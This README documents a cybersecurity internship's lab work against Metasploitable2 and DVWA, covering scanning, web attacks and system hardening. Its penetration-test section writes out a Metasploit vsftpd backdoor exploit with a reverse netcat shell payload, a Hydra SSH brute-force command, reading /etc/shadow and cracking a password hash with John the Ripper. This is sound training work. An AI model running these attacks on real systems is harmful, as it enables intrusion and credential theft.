# ApexPlanet Cybersecurity Internship

This repository contains my practical work completed as part of the **ApexPlanet Cybersecurity Internship**.

The repository documents my cybersecurity learning and practical activities across multiple internship tasks, including cybersecurity fundamentals, lab setup, reconnaissance, network scanning, vulnerability assessment, web application security testing, packet analysis, penetration testing, password security, malware analysis, and system hardening.

---

# Task 1 – Cybersecurity Fundamentals & Lab Setup

## Overview

This section contains my work for **Task 1 of the ApexPlanet Cybersecurity Internship**.

The task focused on building foundational knowledge in cybersecurity, networking, cryptography, Linux, and setting up an isolated cybersecurity lab environment.

## Objectives

* Understand the CIA Triad
* Learn common cybersecurity threats and attack vectors
* Set up a cybersecurity lab using VirtualBox
* Configure Kali Linux as the security testing machine
* Configure Metasploitable2 as an intentionally vulnerable target
* Configure an isolated Host-Only network
* Practice basic Linux commands
* Understand networking fundamentals
* Learn basic cryptography concepts
* Perform encryption and decryption using OpenSSL
* Capture and analyze network traffic using Wireshark
* Explore security tools including Nmap, Burp Suite, and Netcat

---

## Lab Environment

| Component       | Purpose                                |
| --------------- | -------------------------------------- |
| Kali Linux      | Security testing machine               |
| Metasploitable2 | Intentionally vulnerable target        |
| VirtualBox      | Virtualization platform                |
| Wireshark       | Network traffic analysis               |
| Nmap            | Network discovery and service scanning |
| Burp Suite      | Web application testing                |
| Netcat          | Network debugging and communication    |
| OpenSSL         | Cryptographic operations               |

---

## Network Architecture

The lab was designed using a **Host-Only Adapter** so that the intentionally vulnerable Metasploitable2 target remained isolated from external networks.

```text
              Isolated Host-Only Network
                       |
             +---------+---------+
             |                   |
        Kali Linux          Metasploitable2
     Security Testing      Vulnerable Target
          Machine
```

---

## CIA Triad

The CIA Triad was studied as a fundamental cybersecurity model.

### Confidentiality

Confidentiality ensures that sensitive information is accessible only to authorized users and systems.

### Integrity

Integrity ensures that information remains accurate and is not improperly modified or manipulated.

### Availability

Availability ensures that systems, services, and information remain accessible to authorized users when required.

---

## Common Cybersecurity Threats

The following cybersecurity threats and attack vectors were studied:

* Malware
* Phishing
* Password attacks
* Denial-of-Service attacks
* Man-in-the-Middle attacks
* Social engineering
* Web application attacks
* Network-based attacks

---

## Linux Fundamentals

Basic Linux commands and system administration concepts were practiced using Kali Linux.

Topics included:

* File and directory management
* File permissions
* Process management
* User management
* Networking commands
* Package management
* System information
* Basic shell operations

---

## Networking Fundamentals

The following networking concepts were studied:

* IP addressing
* MAC addresses
* TCP/IP
* TCP and UDP
* Ports and protocols
* DNS
* HTTP/HTTPS
* SSH
* FTP
* Network segmentation

---

## Cryptography

Basic cryptography concepts were studied using OpenSSL.

Practical activities included:

* Encryption
* Decryption
* Hashing
* Key generation
* Symmetric cryptography
* Asymmetric cryptography

---

## Network Traffic Analysis

Wireshark was introduced for capturing and analyzing network traffic.

The practical work included identifying:

* Source and destination IP addresses
* TCP and UDP communication
* Network protocols
* Packet headers
* Basic network traffic patterns

---

## Security Tools Explored

The following cybersecurity tools were explored during Task 1:

* Nmap
* Wireshark
* Burp Suite
* Netcat
* OpenSSL
* Kali Linux security utilities

---

# End of Task 1

The activities above completed the foundational cybersecurity concepts and isolated laboratory setup required for Task 1.

---

# Task 2 – Network Security Assessment

## Overview

This section contains my work for **Task 2 of the ApexPlanet Cybersecurity Internship**.

The task focused on **reconnaissance, network scanning, vulnerability assessment, packet analysis, and basic firewall configuration** using the isolated cybersecurity laboratory created during Task 1.

The practical assessment was performed using **Kali Linux** as the security testing machine and **Metasploitable2** as the intentionally vulnerable target.

---

## Objectives

* Perform passive and active reconnaissance
* Identify hosts and services within the isolated lab environment
* Perform TCP and UDP port scanning using Nmap
* Identify running services and their versions
* Perform basic OS detection
* Generate and analyze Nmap scan results
* Perform vulnerability scanning using OpenVAS
* Analyze vulnerabilities based on severity
* Capture and analyze network traffic using Wireshark
* Analyze DNS, HTTP, and FTP traffic
* Demonstrate the security risks of unencrypted FTP traffic
* Analyze SYN traffic associated with a simulated SYN flood in the isolated lab
* Configure basic firewall rules using iptables
* Document findings and recommended security controls

---

## Lab Environment

| Component       | Purpose                                      |
| --------------- | -------------------------------------------- |
| Kali Linux      | Security testing and analysis machine        |
| Metasploitable2 | Intentionally vulnerable target              |
| VirtualBox      | Virtualization platform                      |
| Nmap            | Network discovery and port/service scanning  |
| OpenVAS         | Vulnerability assessment                     |
| Wireshark       | Network traffic capture and analysis         |
| iptables        | Firewall configuration and traffic filtering |

---

## Network Architecture

The assessment was conducted within an **isolated Host-Only network** created in VirtualBox.

This configuration prevents the intentionally vulnerable Metasploitable2 system from being exposed to external networks.

```text
              Isolated Host-Only Network
                       |
             +---------+---------+
             |                   |
        Kali Linux          Metasploitable2
     Security Testing      Vulnerable Target
          Machine
             |
       Nmap / OpenVAS
       Wireshark / iptables
```

---

## 1. Reconnaissance

The reconnaissance phase involved identifying information about the target and understanding the available network services.

### Passive Reconnaissance

The following techniques were studied:

* WHOIS
* Nslookup
* Google Dorking
* Shodan

### Active Reconnaissance

The following techniques were performed within the isolated lab:

* Ping
* Host discovery
* Banner grabbing

---

## 2. Nmap Network Scanning

Nmap was used to identify open ports, running services, service versions, and operating-system information.

### Scans Performed

* TCP SYN scan
* UDP scan
* Service/version detection
* OS detection
* Comprehensive scanning
* Banner grabbing

The complete Nmap scan outputs, commands, screenshots, and related files are available in the [`Nmap`](./Nmap) directory.

---

## 3. OpenVAS Vulnerability Assessment

OpenVAS was used to perform a vulnerability assessment against the Metasploitable2 target.

### Assessment Details

| Parameter          | Details            |
| ------------------ | ------------------ |
| Target             | Metasploitable2    |
| Target IP          | `192.168.56.102`   |
| Scanner            | OpenVAS / GVM      |
| Scan Configuration | Full and fast      |
| Scan Status        | Completed          |
| Scan Date          | September 28, 2026 |

### Vulnerability Summary

The filtered OpenVAS report identified:

| Severity  | Findings |
| --------- | -------: |
| Critical  |       10 |
| High      |        5 |
| Medium    |       30 |
| Low       |        3 |
| **Total** |   **48** |

The assessment identified vulnerabilities involving remote code execution, outdated software, weak/default credentials, backdoor services, insecure legacy protocols, and weak cryptographic configurations.

### OpenVAS Documentation

* [OpenVAS Scan Overview](./OpenVAS/openvas_scan_overview.md)
* [OpenVAS Findings Summary](./OpenVAS/openvas_findings_summary.md)
* [OpenVAS Vulnerability Report](./OpenVAS/openvas_report.pdf)

---

## 4. Wireshark Traffic Analysis

Wireshark was used to capture and analyze network traffic generated within the isolated lab.

The analysis covered:

* DNS traffic
* HTTP traffic
* FTP traffic
* Unencrypted FTP authentication
* SYN traffic associated with a simulated SYN flood

Detailed analysis, screenshots, and related files are available in the [`Wireshark`](./Wireshark) directory.

---

## 5. Firewall Configuration

Basic `iptables` rules were configured to demonstrate how network traffic can be allowed or blocked based on specific ports.

The firewall section documents:

* Firewall rule configuration
* Port blocking
* Verification using network scanning
* Before-and-after observations

---

## 6. Key Findings

The assessment demonstrated several important network-security concepts, including:

* Identification of exposed network services
* Service and version enumeration
* Vulnerability identification using OpenVAS
* Analysis of vulnerability severity
* Risks associated with unencrypted network protocols
* Identification of abnormal SYN traffic
* The role of firewall rules in reducing network exposure
* Importance of patching outdated software
* Importance of disabling unnecessary services
* Importance of network segmentation and access control

---

# End of Task 2

The activities above demonstrated practical network reconnaissance, scanning, vulnerability assessment, traffic analysis, and basic defensive network controls.

---

# Task 3 – Web Application Security

## Overview

This task focuses on identifying, exploiting, and mitigating common web application security vulnerabilities in a controlled laboratory environment using **Damn Vulnerable Web Application (DVWA)**.

All testing was performed locally on Kali Linux against intentionally vulnerable applications and test configurations.

---

## Lab Environment

* **Operating System:** Kali Linux
* **Web Server:** Apache
* **Database:** MariaDB
* **Web Application:** Damn Vulnerable Web Application (DVWA)
* **Security Testing Tool:** Burp Suite
* **Security Headers Analysis:** SecurityHeaders.com

---

## Tasks Completed

### 1. SQL Injection

SQL Injection was demonstrated using DVWA. A UNION-based payload was used to retrieve usernames and password hashes from the application's database.

A prepared-statement implementation was then created to demonstrate SQL Injection mitigation.

[View SQL Injection Documentation](./SQL_Injection/)

---

### 2. Cross-Site Scripting (XSS)

Both Stored XSS and Reflected XSS were demonstrated in DVWA.

A protected PHP page was also created using output encoding and Content Security Policy (CSP) to demonstrate mitigation.

[View XSS Documentation](./XSS/)

---

### 3. Cross-Site Request Forgery (CSRF)

A CSRF attack was demonstrated by creating a forged password-change request against the vulnerable DVWA endpoint.

Token-based CSRF protection was then implemented using a server-side session token. A forged request without the token was successfully rejected.

[View CSRF Documentation](./CSRF/)

---

### 4. File Inclusion

Local File Inclusion (LFI) was demonstrated by reading the `/etc/passwd` file through the vulnerable DVWA File Inclusion functionality.

Remote File Inclusion (RFI) was also demonstrated using a harmless PHP test payload hosted on a local HTTP server.

[View File Inclusion Documentation](./File_Inclusion/)

---

### 5. Burp Suite Advanced

Burp Suite was used to intercept DVWA login traffic, inspect and modify HTTP requests, and perform username fuzzing using Intruder.

[View Burp Suite Documentation](./Burp_Suite/)

---

### 6. Web Security Headers

A public test website was analyzed using SecurityHeaders.com.

Security headers were then configured on the local Apache server using `mod_headers`:

* X-Content-Type-Options
* X-Frame-Options
* Referrer-Policy
* Permissions-Policy

The headers were verified using `curl`.

[View Security Headers Documentation](./Security_Headers/)

---

## Security Testing Summary

| Security Area    | Attack / Test                     | Mitigation / Defensive Measure         |
| ---------------- | --------------------------------- | -------------------------------------- |
| SQL Injection    | UNION-based SQL Injection         | Prepared Statements                    |
| Stored XSS       | JavaScript payload execution      | Output Encoding + CSP                  |
| Reflected XSS    | Reflected JavaScript payload      | Output Encoding + CSP                  |
| CSRF             | Forged password-change request    | CSRF Token                             |
| LFI              | `/etc/passwd` disclosure          | Input validation and file allowlisting |
| RFI              | Controlled remote PHP inclusion   | Disable unnecessary remote inclusion   |
| Burp Suite       | Request interception/modification | Security testing and request analysis  |
| Intruder         | Username fuzzing                  | Input handling and monitoring          |
| Security Headers | HTTP header analysis              | Apache security headers                |

---

## Key Learning Outcomes

Through this task, the following concepts were practiced:

* Identifying common web application vulnerabilities
* Understanding how vulnerable input handling can be exploited
* Using Burp Suite for HTTP request analysis
* Understanding SQL Injection and prepared statements
* Understanding Stored and Reflected XSS
* Implementing CSP and output encoding
* Understanding CSRF and token-based protection
* Identifying LFI and RFI vulnerabilities
* Configuring and verifying HTTP security headers
* Documenting security testing results with screenshots

---

## Evidence

Each section contains its corresponding screenshots, testing results, and mitigation notes.

This task was performed entirely in a controlled local cybersecurity laboratory environment.

---

# End of Task 3

---

# Task 4 – Penetration Testing Workflow and System Hardening

## Objective

The objective of Task 4 was to understand and demonstrate a complete penetration testing workflow in an isolated and authorized lab environment.

The workflow covered:

**Reconnaissance → Scanning → Exploitation → Post-Exploitation → Password Attacks → Phishing Awareness → Malware Analysis → System Hardening → Reporting**

All testing was performed against the intentionally vulnerable **Metasploitable2** virtual machine using **Kali Linux** as the security testing machine.

---

# 1. Lab Environment

| Component               | Details                      |
| ----------------------- | ---------------------------- |
| Attacker                | Kali Linux                   |
| Target                  | Metasploitable2              |
| Kali Host-Only IP       | `192.168.56.103`             |
| Metasploitable2 IP      | `192.168.56.102`             |
| Network                 | VirtualBox Host-Only Network |
| Additional Kali Network | NAT for Internet access      |

The lab was isolated using a VirtualBox Host-Only network to prevent testing against external systems.

---

# 2. Reconnaissance and Scanning

## 2.1 Nmap Service Enumeration

The target was scanned to identify exposed services and their versions.

```bash
nmap -sV -p 21,22,6200 192.168.56.102
```

Important services identified included:

* TCP 21 – FTP
* TCP 22 – SSH
* TCP 6200 – Backdoor shell listener associated with the VSFTPD 2.3.4 exploit

The FTP service was identified as:

```text
vsftpd 2.3.4
```

The SSH service was identified as:

```text
OpenSSH 4.7p1 Debian 8ubuntu1
```

The outdated versions indicated potential security weaknesses suitable for controlled lab exploitation.

---

# 3. Exploitation – VSFTPD 2.3.4 Backdoor

## 3.1 Vulnerability Identification

The target was running **vsftpd 2.3.4**, a version associated with a known backdoor vulnerability.

Metasploit was used to demonstrate exploitation in the authorized lab.

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

The target was configured as:

```text
RHOSTS 192.168.56.102
RPORT 21
```

A reverse connection was configured to the Kali Host-Only address:

```text
LHOST 192.168.56.103
LPORT 4444
```

The payload used successfully was:

```text
cmd/unix/reverse_netcat
```

The exploit successfully opened a command shell on the target.

---

# 4. Post-Exploitation

After gaining access, basic system information and privilege level were checked.

### Current User

```bash
whoami
```

Output:

```text
root
```

### User and Group Information

```bash
id
```

The result confirmed UID 0 / root privileges.

### Operating System Information

```bash
uname -a
```

This provided information about the Metasploitable2 Linux kernel and architecture.

The successful exploitation therefore demonstrated that a vulnerable network service could lead to **remote command execution with root-level privileges**.

### Note

A Meterpreter session was not successfully established with this exploit. Therefore, Meterpreter-specific commands such as `sysinfo` and `hashdump` were not claimed as completed. The successful root command shell was used for the subsequent authorized demonstrations.

---

# 5. SSH Password Attack

## 5.1 SSH Enumeration

SSH was identified using:

```bash
nmap -sV -p 22 192.168.56.102
```

The target was running:

```text
OpenSSH 4.7p1 Debian 8ubuntu1
```

A small controlled password list was created for the lab:

```text
123456
password
admin
msfadmin
letmein
```

The username tested was:

```text
msfadmin
```

## 5.2 Hydra Attempt

Hydra was used to demonstrate an SSH password attack:

```bash
hydra -l msfadmin -P ~/ssh_passwords.txt ssh://192.168.56.102 -t 1
```

The attack could not proceed because the modern Hydra SSH implementation could not negotiate a compatible MAC algorithm with the very old OpenSSH server.

The error indicated that the target only supported legacy MAC algorithms such as:

```text
hmac-md5
hmac-sha1
```

while the modern Hydra implementation offered newer algorithms.

### Result

The Hydra attack was **attempted but not successfully completed** due to compatibility between the modern attack tool and the obsolete SSH service.

Manual SSH authentication was subsequently verified using compatible legacy SSH options.

This limitation was documented rather than claiming a successful Hydra brute-force attack.

---

# 6. Password Hash Extraction and John the Ripper

After obtaining authorized root access to Metasploitable2, the password hash database was examined.

```bash
cat /etc/shadow
```

The `msfadmin` account hash was extracted for controlled offline password-cracking analysis.

The hash was saved locally on Kali:

```bash
echo 'msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/' > ~/metasploitable_hash.txt
```

John the Ripper was then executed:

```bash
john ~/metasploitable_hash.txt
```

John identified the hash as:

```text
md5crypt
```

The password was successfully recovered as:

```text
msfadmin
```

The result was verified using:

```bash
john --show ~/metasploitable_hash.txt
```

This demonstrated the security risk of weak passwords combined with an outdated password-hashing configuration.

---

# 7. Phishing Awareness Simulation

A local phishing-awareness simulation was created for educational purposes.

The simulation was stored in:

```text
~/Task4/phishing_simulation/
```

A local HTTP server was used:

```bash
python3 -m http.server 8080
```

The page was accessed locally through:

```text
http://127.0.0.1:8080
```

The simulation contained a fake login-style interface but **did not collect, store, or transmit credentials**.

The page clearly displayed:

> PHISHING AWARENESS SIMULATION – This is a training page. Do NOT enter real credentials.

The awareness section demonstrated several phishing detection techniques:

* Check the website domain carefully.
* Avoid unexpected login links.
* Be suspicious of urgent requests.
* Look for spelling and branding inconsistencies.
* Never provide passwords through suspicious links.

Clicking the login button displayed a message explaining that the page was only a training simulation.

---

# 8. Malware Basics – Static and Dynamic Analysis

A harmless Python training sample was created for malware-analysis practice.

The sample performed only benign actions such as:

* Displaying operating system information
* Displaying the hostname
* Creating a harmless test file
* Waiting for a few seconds
* Exiting normally

## 8.1 Static Analysis

The following commands were used:

```bash
file benign_sample.py
```

```bash
sha256sum benign_sample.py
```

```bash
strings benign_sample.py
```

```bash
cat benign_sample.py
```

These commands were used to examine the file type, cryptographic hash, readable strings, and source code without executing it.

## 8.2 Dynamic Analysis

The benign sample was executed in the isolated lab:

```bash
python3 benign_sample.py
```

The resulting file was checked using:

```bash
ls -l analysis_test.txt
```

and:

```bash
cat analysis_test.txt
```

This demonstrated the difference between:

### Static Analysis

Examining a file without execution.

### Dynamic Analysis

Observing the behavior of a sample while it executes in a controlled environment.

No real malware was used.

---

# 9. System Hardening

After completing the exploitation demonstrations, several defensive hardening actions were performed on Metasploitable2.

## 9.1 Initial Service Enumeration

Before hardening, the listening services were recorded using:

```bash
netstat -tulpn
```

This provided a baseline for comparison.

---

## 9.2 Security Update Check

The package repositories were refreshed using:

```bash
sudo apt-get update
```

Because Metasploitable2 is an intentionally vulnerable and extremely old lab image, a full system upgrade was not performed because it could alter or break the vulnerabilities required for the penetration-testing exercises.

---

## 9.3 Firewall Configuration

The VSFTPD backdoor-related TCP port was blocked using:

```bash
sudo iptables -A INPUT -p tcp --dport 6200 -j DROP
```

The firewall rule was verified using:

```bash
sudo iptables -L INPUT -n --line-numbers
```

This demonstrated how a firewall can be used to block unwanted traffic to a known malicious or vulnerable service port.

---

## 9.4 Disable Unused FTP Service

The FTP service was found to be managed through `xinetd`.

The configuration was located at:

```text
/etc/xinetd.d/vsftpd
```

The FTP service was disabled by changing:

```text
disable = no
```

to:

```text
disable = yes
```

The change was verified with:

```bash
grep -i disable /etc/xinetd.d/vsftpd
```

The resulting configuration was:

```text
disable = yes
```

The `xinetd` configuration was then reloaded:

```bash
sudo kill -HUP $(pidof xinetd)
```

Finally, port 21 was checked:

```bash
sudo netstat -tulpn | grep :21
```

No output was returned, confirming that FTP was no longer listening on TCP port 21.

A final service enumeration was also performed:

```bash
sudo netstat -tulpn
```

This provided the post-hardening service state.

---

# 10. Findings and Security Impact

| Finding                  | Impact                                      | Remediation                                  |
| ------------------------ | ------------------------------------------- | -------------------------------------------- |
| VSFTPD 2.3.4 backdoor    | Remote command execution and root access    | Remove/upgrade vulnerable FTP software       |
| Exposed FTP service      | Increased attack surface                    | Disable FTP if not required                  |
| Open TCP 6200            | Potential backdoor communication            | Block using firewall                         |
| Weak `msfadmin` password | Password compromise                         | Use strong unique passwords                  |
| Legacy SSH service       | Weak/obsolete cryptographic support         | Upgrade SSH                                  |
| Outdated software        | Increased vulnerability exposure            | Apply security patches                       |
| Phishing risk            | Credential theft through social engineering | User awareness training                      |
| Malware risk             | Potential malicious execution               | Use endpoint protection and sandbox analysis |

---

# 11. Penetration Testing Methodology Summary

The task demonstrated the major phases of a penetration testing workflow:

### 1. Reconnaissance

Information about the target environment and network services was collected.

### 2. Scanning

Nmap was used to identify open ports and service versions.

### 3. Exploitation

The vulnerable VSFTPD service was exploited using Metasploit.

### 4. Post-Exploitation

Root-level access was verified and system information was collected.

### 5. Password Attacks

SSH password testing was attempted with Hydra, while an extracted password hash was successfully cracked using John the Ripper.

### 6. Phishing Awareness

A local, non-functional phishing-awareness simulation was created.

### 7. Malware Analysis

A harmless sample was examined using static and dynamic analysis techniques.

### 8. System Hardening

Firewall rules were applied and an unnecessary FTP service was disabled.

### 9. Reporting

The findings, security impact, limitations, and remediation recommendations were documented.

---

# 12. Conclusion

Task 4 provided practical experience with the complete penetration-testing lifecycle in an isolated cybersecurity lab.

The exercises demonstrated how outdated services, weak credentials, exposed network ports, and social-engineering threats can increase an organization's attack surface.

The task also demonstrated the importance of defensive measures such as:

* Regular security updates
* Strong passwords
* Firewall rules
* Removing unnecessary services
* Security awareness training
* Malware analysis
* Continuous vulnerability assessment

All activities were performed against an intentionally vulnerable Metasploitable2 system in a controlled lab environment for educational purposes.

---

# Overall Skills Demonstrated

Through Tasks 1–4, I gained practical exposure to:

* Cybersecurity fundamentals
* Linux fundamentals
* Networking
* Network reconnaissance
* Port and service enumeration
* Vulnerability assessment
* Network traffic analysis
* Web application security testing
* SQL Injection
* Cross-Site Scripting
* CSRF
* File Inclusion
* Penetration testing
* Password security
* Password-hash analysis
* Cryptography fundamentals
* System hardening
* Security awareness
* Basic malware-analysis concepts
* Security documentation and reporting

---

# Tools & Technologies

* Kali Linux
* VirtualBox
* Metasploitable2
* DVWA
* Nmap
* OpenVAS / GVM
* Wireshark
* Burp Suite
* Metasploit Framework
* Hydra
* John the Ripper
* Netcat
* OpenSSL
* iptables
* Linux
* Apache
* PHP
* MariaDB

---

# Disclaimer

All security testing documented in this repository was performed for **educational purposes in controlled and authorized laboratory environments**.

Metasploitable2 and DVWA were intentionally vulnerable systems used for cybersecurity training. No unauthorized systems or real-world targets were tested.
